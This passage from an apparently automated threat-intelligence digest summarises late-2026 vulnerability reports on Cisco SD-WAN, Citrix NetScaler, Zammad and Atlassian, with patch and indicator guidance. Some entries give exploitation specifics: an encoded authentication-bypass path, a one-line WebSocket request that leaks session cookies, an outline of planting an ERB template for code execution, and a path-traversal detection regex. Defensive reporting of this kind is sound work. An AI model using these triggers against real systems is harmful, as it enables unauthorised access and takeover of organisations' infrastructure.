CVE-2026-76504 Cisco Catalyst SD-WAN Manager API Authentication Bypass Vulnerability | Reversed by Horizon3 CVE-2026-76504 is a critical authentication bypass vulnerability in Cisco Catalyst SD-WAN Manager that allows an unauthenticated remote attacker to gain API access as the admin user. Cisco assigns it a CVSS 3.1 score of 9.8 and has confirmed active exploitation. CISA added the vulnerability to its Known Exploited Vulnerabilities (KEV) catalog on September 30, 2026. Horizon3.ai’s attack research team reverse engineered the vulnerability. Technical Details The vulnerability affects API session-based authentication management. Improper handling of URI encoding in an HTTP request allows an attacker to bypass an authentication rule protecting a specific API endpoint. An attacker can exploit the issue by sending a crafted request containing an encoded character in the j_security_check path, such as /%6a_security_check. Successful exploitation grants API access as the admin user without requiring valid credentials or user interaction. By default, the admin user holds the netadmin role, which permits all operations. This access exposes configuration and policy control over the managed SD-WAN fabric. Vulnerable releases are affected regardless of system configuration. NodeZero® Proactive Security Platform: Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether this vulnerability can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether authentication bypass is possible. Patch immediately: Upgrade to a fixed release and apply Cisco’s recommended access restrictions while arranging the upgrade. Re-run the test: Confirm the vulnerability is no longer exploitable after remediation. Stop Guessing, Start Proving Schedule a demo Indicators of Compromise Cisco recommends reviewing the following logs: Indicator Type Description /var/log/nms/containers/service-proxy/serviceproxy-access.log File Review j_security_check requests from unknown or unauthorized IP addresses, including encoded paths such as /%6a_security_check. /var/log/nms/vmanage-server.log File Review related requests from unknown or unauthorized IP addresses, especially those involving usernames beginning with viptela-reserved-. Encoding %6a is only one example; other encoded characters can trigger the vulnerability. Cisco cautions that these indicators can occur during normal operations, so assess them against expected network activity before concluding that compromise occurred. Affected versions & patch Affected Cisco Catalyst SD-WAN Manager releases in the listed trains that precede their respective first fixed releases are affected. Releases earlier than 20.9 must migrate to a fixed release. Fixed Release train First fixed release Earlier than 20.9 Migrate to a fixed release 20.9 20.9.10.1 20.12 20.12.8.2 20.15 20.15.6.1 20.18 20.18.4.1 26.1 26.1.2.1 26.2 26.2.1 Cisco has also addressed the vulnerability in Cisco SD-WAN Cloud (Cisco Managed) release 20.15.605 . No customer action is required for that service. Mitigations Cisco states that no workaround addresses the vulnerability. Until on-premises systems are upgraded, restrict access from untrusted networks, allow only known trusted hosts, and protect SD-WAN control components behind a firewall. These restrictions are temporary mitigations. Upgrade to an appropriate fixed release to remediate the vulnerability. Timeline September 30, 2026: Cisco published its security advisory, identified fixed releases, and confirmed active exploitation. September 30, 2026: CISA added CVE-2026-76504 to its KEV catalog. September 30, 2026: Horizon3 alerted affected Rapid Response customers and released the NodeZero Rapid Response test for CVE-2026-76504. References Cisco Security Advisory CVE.org Record: CVE-2026-76504 CISA Known
```

#### Corroborating sources (2)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-76504 | Cisco Catalyst SD-WAN Manager API Authentication Bypass Vulnerability | Reversed by Horizon3
  - Published: 2026-10-01T00:35:46+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - Summary: CVE-2026-76504 is a critical, actively exploited Cisco Catalyst SD-WAN Manager vulnerability that allows unauthenticated API access as the admin user. Horizon3 reverse engineered the flaw, and NodeZero® Rapid Response safely validates exposure.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: CISA Adds Exploited Cisco Catalyst SD-WAN Manager Auth Bypass to KEV
  - Published: 2026-10-01T10:33:16+00:00
  - Link: https://thehackernews.com/2026/10/cisa-adds-exploited-cisco-catalyst-sd.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical authentication bypass flaw impacting Cisco Catalyst SD-WAN Manager to its Known Exploited Vulnerabilities (KEV), following reports of active exploitation. The vulnerability, tracked as CVE-2026-76504 (CVSS score: 9.8), could allow an unauthenticated, remote attacker to access an affected system with

### Cluster e51eaa3924 — score 37

- Title: Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30)
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-30T20:00:04+00:00
- Link: https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-88771, CVE-2026-88772

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, web_shell_backdoor, zero_day
- affected_products: Palo Alto Networks
- cve_ids: CVE-2026-88771, CVE-2026-88772
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: zero_day, ddos, web_shell_backdoor, active_exploitation
- affected_products: Palo Alto Networks
- cve_ids: CVE-2026-88771, CVE-2026-88772
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Unit 42 is aware of possible 0-day activity against NetScaler devices. Citrix reports CVE-2026-88771, CVE-2026-88772 have been exploited in the wild. The post Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30) appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center High Profile Threats Vulnerabilities Vulnerabilities Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30) 9 min read Related Products Advanced Threat Prevention Advanced URL Filtering Cloud-Delivered Security Services Cortex Cortex Xpanse Next-Generation Firewall Unit 42 Incident Response By: Unit 42 Published: September 30, 2026 Categories: High Profile Threats Vulnerabilities Tags: Citrix CVE-2026-88771 CVE-2026-88772 Denial of service Remote Code Execution Zero-day Share Executive Summary Unit 42 is aware of possible zero-day activity against NetScaler devices. In a Citrix report that details several CVEs , they noted that CVE-2026-88771 and CVE-2026-88772 have been exploited in the wild. The threat actors exploited these vulnerabilities to deliver web shells and establish their initial access and persistence into organizations. Analysis is ongoing to determine any post-compromise activity. As of Sept. 27, 2026, Palo Alto Networks Cortex Xpanse has identified 50,277 exposed instances that could potentially be vulnerable to these CVEs based on our telemetry. It is important to note that activity after Sept. 27, 2026 might not match the same indicators of compromise (IoCs) or tactics, techniques and procedures (TTPs) from the original zero-day activity. We group pre-disclosure and post-disclosure activities to differentiate what we believe the original actors were doing with the exploit from what additional actors, security researchers and internet scanning tools are doing now that the vulnerabilities are public. The vulnerabilities are: CVE-2026-88771 : A remote code execution (RCE) vulnerability that fails to properly validate input and allows an unauthenticated actor to run commands against NetScaler Application Delivery Controller (ADC) and NetScaler Gateway systems CVE-2026-88772 : A memory overflow vulnerability that can lead to a remote code execution (RCE) or denial of service (DoS) on the Datagram Transport Layer Security (DTLS) configuration on NetScaler ADC and NetScaler Gateway systems Both vulnerabilities have a CVSS v4.0 base score of 9.5. Palo Alto Networks customers are better protected from this activity through our products and services, such as: Advanced URL Filtering Next-Generation Firewall with Advanced Threat Prevention Cortex XDR and XSIAM The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk. Vulnerabilities Discussed CVE-2026-88771 , CVE-2026-88772 Pre-Disclosure Activity This section is our analysis of threat activity that occurred prior to the public disclosure of these zero-day vulnerabilities. We saw two groups of web shell activity: Datagram Transport Layer Security (DTLS) exploitation dropping .deb web shell files A three-stage command injection exploit chain that drops PHP web shells Initial Activity: Fingerprinting NetScaler Devices The earliest activity we identified occurred on Aug. 21, 2026, from two hosts, one at 104.248.244[.]66 and one at 77.83.199[.]39 . First, 104.248.244[.]66 requested /admin_ui/common/css/ns/ui.css from a NetScaler Gateway appliance at a US-based organization. Approximately two hours later, the host at 77.83.199[.]39 requested the same file, /admin_ui/common/css/ns/ui.css . Nearly two hours after that second request, 77.83.199[.]39 requested /vpn/js/rdx/core/lang/rdx_en.json.gz . These requests are consistent with version fingerprinting. On August 21 and 22, these two hosts and 78.47.24[.]217 sent the same requests to more than 100 other systems. CVE-2026-88772: DTLS Exploitation To .deb Webshell Activity In this exploit chain, the attacker sends crafted DTLS traffic to a vulnerable NetScaler device, which processes the malicious packet. This malicious packet causes memory corruption or a crash that can lead to either code execution or denial of service. Between September 4 and 24, the threat actor repe
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30)
  - Published: 2026-09-30T20:00:04+00:00
  - Link: https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
  - Summary: Unit 42 is aware of possible 0-day activity against NetScaler devices. Citrix reports CVE-2026-88771, CVE-2026-88772 have been exploited in the wild. The post Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30) appeared first on Unit 42 .

### Cluster bd1b3dce0b — score 36

- Title: Citrix NetScaler Zero-Day Exploited in the Wild Crashes SAML Authentication Services
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-10-05T18:25:16+00:00
- Link: https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
- Fetch status: ok
- Member count: 6
- Corroborating source count: 5
- Strong signals: CVE-2026-88779, Citrix

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ddos, supply_chain, web_shell_backdoor, zero_day
- affected_industries: government
- affected_products: Citrix, WordPress, npm
- cve_ids: CVE-2026-88779
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day, data_breach, ddos, active_exploitation
- affected_industries: government
- affected_products: Citrix, npm, WordPress
- cve_ids: CVE-2026-88779
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Executive Summary A high-severity memory overflow vulnerability (CVE-2026-88779, CVSS v4.0 8.7) was disclosed affecting Citrix NetScaler ADC and NetScaler Gateway, allowing attackers to crash the SAML authentication service via crafted network requests. Due to the potential for prolonged service outages blocking VPN and SSO access across entire organizations, immediate patching is required. About CVE-2026-88779 The […]
```

#### Full body

```
Executive Summary A high-severity memory overflow vulnerability (CVE-2026-88779, CVSS v4.0 8.7) was disclosed affecting Citrix NetScaler ADC and NetScaler Gateway, allowing attackers to crash the SAML authentication service via crafted network requests. Due to the potential for prolonged service outages blocking VPN and SSO access across entire organizations, immediate patching is required. About CVE-2026-88779 The issue originates from the nsaaad SAML authentication handler, where a memory overflow (CWE-119) in the processing of SAML authentication requests leads to a service crash. By sending specially crafted authentication requests to appliances configured as a SAML service provider or SAML identity provider, attackers can take down the authentication service, potentially locking out all users from VPN and SSO access. Repeated triggering can keep services offline indefinitely. No authentication is required to exploit this issue. Affected Systems The following components are affected: NetScaler ADC and NetScaler Gateway, versions 14.1 before 14.1-73.41 and 13.1 before 13.1-64.28; NetScaler ADC 14.1-FIPS before 14.1-73.41; and NetScaler ADC 13.1-FIPS and 13.1-NDcPP before 13.1-37.282. These components are widely deployed across enterprise environments for VPN, load balancing, and single sign-on, particularly when SAML authentication is enabled via add authentication samlAction (SAML SP) or add authentication samlIdPProfile (SAML IdP) configurations. Citrix-managed cloud services are not affected, but Secure Private Access Hybrid deployments using vulnerable NetScaler instances are in scope. Users should upgrade to NetScaler ADC/Gateway 14.1-73.41 or later, or 13.1-64.28 or later (with corresponding FIPS/NDcPP versions). Appliance administrators should also check for SAML configuration exposure and monitor for unexplained nsaaad service crashes or appliance reboots as indicators of compromise. The attacker IP 213.209.159[.]55 has been observed in exploitation attempts and should be blocked. Risk Impact At the time of writing, watchTowr Labs has independently reproduced the vulnerability after observing NetScaler honeypot activity, and Citrix has confirmed targeted exploitation in the wild. CISA added CVE-2026-88779 to its Known Exploited Vulnerabilities catalog on October 4, 2026, setting a mandatory remediation deadline of October 7 for federal agencies. Some researchers have noted indications that the memory overflow may also enable remote code execution beyond the documented denial-of-service scope, though this has not been officially confirmed by Citrix. This is the sixth exploited NetScaler vulnerability added to CISA KEV in 2026. Regardless, the severity and ease of exploitation make this vulnerability high risk, especially in internet-facing deployments. Successful exploitation could allow attackers to crash authentication services and lock out entire organizations, sustain prolonged outages through repeated triggering, and potentially achieve remote code execution, leading to service disruption, data exposure, or full infrastructure compromise. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable NetScaler versions, understand their exposure in context — including internet accessibility, runtime reachability, and asset criticality — and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the alert view, helping security teams focus on the most critical remediation paths first. Related articles Research Critical Citrix NetScaler Zero-Days Under Active Exploitation Sep 29, 2026 Research WordPress "Comment2Shell" XSS-to-RCE Chain Lets Unauthenticated Attackers Compromise Servers via Malicious Comments Sep 22, 2026 Research npm Supply-Chain Attack Abuses Trusted Publishing to Ship GHAPPIER Loader Sep 22, 2026 Stay in the loop Keep up to date with everything you need to know about cloud security and our latest research By
```

#### Corroborating sources (5)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Citrix NetScaler Zero-Day Exploited in the Wild Crashes SAML Authentication Services
  - Published: 2026-10-05T18:25:16+00:00
  - Link: https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
  - Summary: Executive Summary A high-severity memory overflow vulnerability (CVE-2026-88779, CVSS v4.0 8.7) was disclosed affecting Citrix NetScaler ADC and NetScaler Gateway, allowing attackers to crash the SAML authentication service via crafted network requests. Due to the potential for prolonged service outages blocking VPN and SSO access across entire organizations, immediate patching is required. About CVE-2026-88779 The […]
- **Sophos X-Ops** (detection_response_operations)
  - Title: Citrix NetScaler vulnerability (CVE-2026-88779) in active exploitation
  - Published: 2026-10-05T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/citrix-netscaler-vulnerability-cve-2026-88779-in-active-exploitation
  - Summary: Categories: Threat Research Tags: advisory, vulnerability, Citrix
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New NetScaler Zero-Day Exploited in Targeted Attacks Can Knock SAML Deployments Offline
  - Published: 2026-10-05T06:40:19+00:00
  - Link: https://thehackernews.com/2026/10/new-netscaler-zero-day-exploited-in.html
  - Summary: Citrix has released security updates for a high-severity security flaw in NetScaler ADC and NetScaler Gateway that has been exploited as part of targeted zero-day attacks. The vulnerability, tracked as CVE-2026-88779, carries a CVSS score of 8.7 out of 10.0. "CVE-2026-88779 is a memory overflow vulnerability in Citrix NetScaler ADC and Citrix NetScaler Gateway that can lead to
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Citrix NetScaler Targeted Via New Zero Day
  - Published: 2026-10-05T13:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/citrix-netscaler-zero-day/
  - Summary: The memory buffer vulnerability can result in denial of service to customers, with CISA warning it poses “significant risks” to the federal government
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: Exploitation of Citrix NetScaler Zero-Day Hits Appliances Patched Days Earlier
  - Published: 2026-10-06T15:14:56+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1wz5746/exploitation_of_citrix_netscaler_zeroday_hits/
  - Summary: submitted by /u/NISMO1968 [link] [comments]

### Cluster 385168e58d — score 32

- Title: Zammad CVE-2026-102489: Session Leak to RCE
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-07T10:00:00+00:00
- Link: https://horizon3.ai/attack-research/disclosures/cve-2026-102489-zammad-session-leak-rce/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-102489

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- affected_products: Anthropic/Claude, GitHub
- cve_ids: CVE-2026-102489, CVE-2026-102490
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- affected_products: GitHub, Anthropic/Claude
- cve_ids: CVE-2026-102489, CVE-2026-102490
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Horizon3 reverse engineered CVE-2026-102489 in Zammad, reproduced the unauthenticated WebSocket session leak, traced the vulnerable code path, and demonstrated how a leaked admin session can lead to remote code execution.
```

#### Full body

```
Zammad CVE-2026-102489: Session Leak to RCE Zach Hanley October 7, 2026 Disclosures Introduction On 24 September 2026, the Dutch Institute for Vulnerability Disclosure (DIVD) announced publicly that they had suffered a security incident and had attributed it to an “agentic AI powered attack” given the forensic artifacts they discovered during the incident response. They attributed the source of the initial breach to Zammad , a helpdesk and ticketing application. During their investigation, they determined that two distinct 0-day vulnerabilities were abused: CVE-2026-102489 – A session hijack that ultimately allows executing code as the zammad user CVE-2026-102490 – A privilege escalation that allows escalating to root Soon after, DIVD released further details of the Zammad vulnerabilities and released a Indicators of Compromise script which looked for leaked session cookies in error logs. CVE-2026-102489: Zammad Session Leak Given the above details, it was classified as a session hijack and that session cookies would appear in the logs, so we dug in. We prompted a vulnerability research harness, with Anthropic’s Opus 4.8 as the model, to attempt to identify and reproduce the issues given: The DIVD CSIRT cases The DIVD IOC script The Zammad open-source GitHub repository After a couple hours, the results were back and the harness did confirm that if there was a way to trigger an error it would leak the session cookie strings, but it was unable to find an unauthenticated trigger request. Fuzzing The Code Re-prompting the agent, we advised it to build fuzzing tooling to target the areas of code it suspected most likely to be associated with the vulnerable area of code. Several minutes later into a fuzzing campaign against the websocket code, it triggered an error that was reflected back to the requestor which contained the session cookies we were looking for. The vulnerability trigger is a simple single request to the WebSocket endpoint, /ws, with a payload of {“event”: “base”}. Figure 1. Triggering the leak The server then reflects this error back to the client, which leaks the cookies for all active users. Figure 2. Example exploit request Understanding the Source Starting from the architectural perspective, Zammad is a Ruby application that utilizes websockets. It stores all global connection states in the @clients class-level instance variable. The headers variable notably includes the session Cookie header. Figure 3. websocket_server.rb storing headers Every event that occurs in the framework, the @clients variable is passed with it. There is no event type or client based filtering. Figure 4. websocket_server.rb event dispatching The base event handler for the session object takes every parameter passed to it and unpacks each key-value pair stored in it. Which means the sensitive cookies are stored inside the headers key of the clients variable. Figure 5. sessions/event/base.rb handler Lastly, in sessions/event.rb, the run() method returns the entire event’s instance variables in a response to the client when an error occurs. Figure 6. Returns event variables in response to client When a client sends {“event”:”base”}, the dispatcher successfully resolves Sessions::Event::Base as a real Ruby constant, instantiates it with the full @clients registry mass-assigned onto the object, then fails when .run is called – as Base has no implementation. Ruby constructs the NoMethodError message to include the receiver’s full object representation, which contains every instance variable including @clients, and sessions/event.rb returns that message string directly to the caller. Authenticated Session to Code Execution Once an attacker has a valid admin session cookie from the leak, they can write arbitrary files into the Zammad application directory via the package installation endpoint. By writing a malicious ERB template that overrides the built-in password reset email view, they can trigger its execution by initiating a password reset f
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Zammad CVE-2026-102489: Session Leak to RCE
  - Published: 2026-10-07T10:00:00+00:00
  - Link: https://horizon3.ai/attack-research/disclosures/cve-2026-102489-zammad-session-leak-rce/
  - Summary: Horizon3 reverse engineered CVE-2026-102489 in Zammad, reproduced the unauthenticated WebSocket session leak, traced the vulnerable code path, and demonstrated how a leaked admin session can lead to remote code execution.

### Cluster 143cae0708 — score 31

- Title: More RMM Tools In the Wild, (Tue, Oct 6th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-06T13:16:02+00:00
- Link: https://isc.sans.edu/diary/rss/33400
- Fetch status: fetch_failed:HTTPError
- Member count: 3
- Corroborating source count: 2
- Strong signals: ScreenConnect

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng
- affected_products: ScreenConnect
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government, tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: ScreenConnect
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
It seems that a trend startedâ€¦ I continue my journey discovering more RMM ("Remote Management & Monitoring") tools abused by threat actors! A few days ago, I wrote a diary[ 1 ] about ScreenConnect used in the wild. Today, I found another one.
```

#### Corroborating sources (2)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: More RMM Tools In the Wild, (Tue, Oct 6th)
  - Published: 2026-10-06T13:16:02+00:00
  - Link: https://isc.sans.edu/diary/rss/33400
  - Summary: It seems that a trend startedâ€¦ I continue my journey discovering more RMM ("Remote Management & Monitoring") tools abused by threat actors! A few days ago, I wrote a diary[ 1 ] about ScreenConnect used in the wild. Today, I found another one.
- **Huntress** (detection_response_operations)
  - Title: Phishing Campaign Abuses Microsoft Power BI to Deploy Rogue RMMs
  - Published: 2026-10-07T13:00:00+00:00
  - Link: https://www.huntress.com/blog/screenconnect-power-bi
  - Summary: A recent phishing campaign abused Microsoft Power BI links to deliver multiple rogue ScreenConnect clients.

### Cluster a4d6dda2bb — score 31

- Title: CVE-2026-21589: Critical unauthenticated arbitrary file access in Atlassian products
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-07T12:11:26+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-21589-critical-unauthenticated-arbitrary-file-access-in-atlassian-products
- Fetch status: ok
- Member count: 10
- Corroborating source count: 8
- Strong signals: Atlassian Confluence, Atlassian Jira, CVE-2026-21589

#### Cluster taxonomy (union across members)
- affected_products: Atlassian Confluence, Atlassian Jira
- cve_ids: CVE-2026-21589
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_government, tier_1_offensive_research, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: Atlassian Jira, Atlassian Confluence
- cve_ids: CVE-2026-21589
- urgency_signals: preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On October 5, 2026, Atlassian published a security advisory for CVE-2026-21589 , a critical arbitrary file access vulnerability affecting eight products: Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible, and Fisheye. Atlassian assigned the vulnerability a CVSSv4 score of 9.3 . An unauthenticated remote attacker who knows a target file's exact name and path can access it within the application's web root; the vulnerability does not provide directory listing or enumeration. Atlassian's advisory treats all versions before the applicable fixed releases as affected, including unsupported versions. Affected Atlassian Cloud products have already been patched, and no action is required from Cloud customers. Detailed technical analysis and file-read proof-of-concept scripts are public, so Rapid7 recommends patching on an emergency basis, outside of normal patch cycles, and revi
```

#### Full body

```
Emergent Threat Response CVE-2026-21589: Critical unauthenticated arbitrary file access in Atlassian products Rapid7 Oct 7, 2026 | Last updated on Oct 7, 2026 | 3 min read CVE-2026-21589: Critical unauthenticated arbitrary file access in Atlassian products Table of contents CVE-2026-21589: Critical unauthenticated arbitrary file access in Atlassian products Table of contents Overview On October 5, 2026, Atlassian published a security advisory for CVE-2026-21589 , a critical arbitrary file access vulnerability affecting eight products: Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible, and Fisheye. Atlassian assigned the vulnerability a CVSSv4 score of 9.3 . An unauthenticated remote attacker who knows a target file's exact name and path can access it within the application's web root; the vulnerability does not provide directory listing or enumeration. Atlassian's advisory treats all versions before the applicable fixed releases as affected, including unsupported versions. Affected Atlassian Cloud products have already been patched, and no action is required from Cloud customers. Detailed technical analysis and file-read proof-of-concept scripts are public, so Rapid7 recommends patching on an emergency basis, outside of normal patch cycles, and reviewing access logs for attempted exploitation. Technical overview NVD lists files or directories accessible to external parties ( CWE-552 ) as the weakness associated with CVE-2026-21589. On October 6, watchTowr Labs published a technical analysis based on comparisons of vulnerable and patched Jira, Confluence, and Bitbucket packages. Their analysis identified a path traversal vulnerability in Atlassian's web-resource handling: double-colon ( :: ) sequences can become path separators during request processing, allowing traversal components to reach the resource-loading code, resulting in the contents of arbitrary file being read back to an attacker. Their testing could not traverse outside the Tomcat context, but could read files throughout the application web root. In an Atlassian Crowd deployment that had Jira configured, reading WEB-INF/classes/crowd.properties exposed application credentials. With network access to Crowd, they used those credentials to create a user and add it to jira-administrators ; Crowd's IP allowlisting can block this direct route. Mitigation guidance Organizations should upgrade each affected installation to a listed fixed version or the latest available version. Atlassian's October 5 advisory lists the following fixed versions: Product Fixed versions Bitbucket Data Center 9.4.26 , 10.2.8 , 10.5.1 Confluence Data Center 9.2.26 , 10.2.19 Jira Service Management Data Center 5.12.40 , 10.3.26 , 11.3.12 Jira Software Data Center 9.12.40 , 10.3.26 , 11.3.12 Bamboo Data Center 10.2.24 , 12.1.12 Crowd Data Center 6.3.7 , 7.0.3 , 7.1.7 , 7.2.4 Crucible 4.9.15 Fisheye 4.9.15 Organizations unable to patch immediately should remove affected instances from the internet or otherwise restrict them from external network access. Atlassian provides a Web Application Firewall or proxy rule for all affected products, a Tomcat RewriteValve mitigation for Confluence, Jira Service Management, Jira Software, Bamboo, and Crowd, and a separate urlrewrite.xml rule for Bitbucket. These mitigations are limited and are not replacements for patching. Rapid7 strongly recommends looking for signs of compromise even after the patch has been applied. Atlassian recommends URL-decoding each access-log request line up to twice, then searching for .. immediately adjacent to / , \ , or :: . Alternatively, search raw logs with the vendor-supplied regex: (?is).*(?:/|\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2})(?:\.|%(?:25)*2e){2}(?:/|\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2}|;|%(?:25)*3b|$).* Public testing artifacts for Jira, Confluence, and Bitbucket include a Python file-read PoC and a
```

#### Corroborating sources (8)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-21589: Critical unauthenticated arbitrary file access in Atlassian products
  - Published: 2026-10-07T12:11:26+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-21589-critical-unauthenticated-arbitrary-file-access-in-atlassian-products
  - Summary: Overview On October 5, 2026, Atlassian published a security advisory for CVE-2026-21589 , a critical arbitrary file access vulnerability affecting eight products: Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible, and Fisheye. Atlassian assigned the vulnerability a CVSSv4 score of 9.3 . An unauthenticated remote attacker who knows a target file's exact name and path can access it within the application's web root; the vulnerability does not provide directory listing or enumeration. Atlassian's advisory treats all versions before the applicable fixed releases as affected, including unsupported versions. Affected Atlassian Cloud products have already been patched, and no action is required from Cloud customers. Detailed technical analysis and file-read proof-of-concept scripts are public, so Rapid7 recommends patching on an emergency basis, outside of normal patch cycles, and revi
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-21589 | Atlassian Data Center Products Unauthenticated Arbitrary File Read Vulnerability
  - Published: 2026-10-06T23:15:00+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-21589/
  - Summary: CVE-2026-21589 is a critical vulnerability affecting multiple Atlassian Data Center products that allows unauthenticated attackers to read specific files within the web application root. NodeZero® Rapid Response safely validates exposure.
- **watchTowr Labs** (offensive_vulnerability_research)
  - Title: You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)
  - Published: 2026-10-06T17:01:36+00:00
  - Link: https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/
  - Summary: Welcome back to yet another episode of "security was taken seriously". Being who we are (and constantly being exposed to what we see…), we recognize we have been doomed to eternal damnation as we keep on watching security best practices crumble behind “secure by design”
- **SANS Internet Storm Center** (government_authoritative)
  - Title: Scans for Atlassian vulnerablity (CVE-2026-21589), (Wed, Oct 7th)
  - Published: 2026-10-07T14:59:33+00:00
  - Link: https://isc.sans.edu/diary/rss/33406
  - Summary: On October 5th, Atlassian published patches&#;x26;#;xc2;&#;x26;#;xa0;for multiple products to fix an "Arbitrary File Access" vulnerability &#;x26;#;x5b; CVE-2026-21589 &#;x26;#;x5d;. An attacker can read arbitrary files in the web application&#;x26;#;39;s directory, potentially exposing sensitive information such as configuration files.
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Exploitation attempts against critical Atlassian flaw have begun (CVE-2026-21589)
  - Published: 2026-10-07T14:21:35+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/07/exploitation-critical-atlassian-flaw-cve-2026-21589/
  - Summary: One day after Atlassian released patches fixing a critical arbitrary file access vulnerability (CVE-2026-21589) in its self-managed Data Center products, and a few hours after watchTowr researchers published a technical rundown of the flaw, attackers have been spotted attempting to exploit it. CVE-2026-21589 PoC in action (Source: watchTowr) “Exploitation attempts have now started to hit our honeypot network,” threat intelligence vendor Previdian warned late Tuesday, and shared a list of attacker IPs. About CVE-2026-21589 CVE-2026-21589 … More → The post Exploitation attempts against critical Atlassian flaw have begun (CVE-2026-21589) appeared first on Help Net Security .
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589) - watchTowr Labs
  - Published: 2026-10-06T17:07:11+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1wz839l/you_wont_hear_about_these_even_in_myths_atlassian/
  - Summary: submitted by /u/dx7r__ [link] [comments]
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Hackers exploit critical Atlassian flaw after public PoC release
  - Published: 2026-10-07T12:49:01+00:00
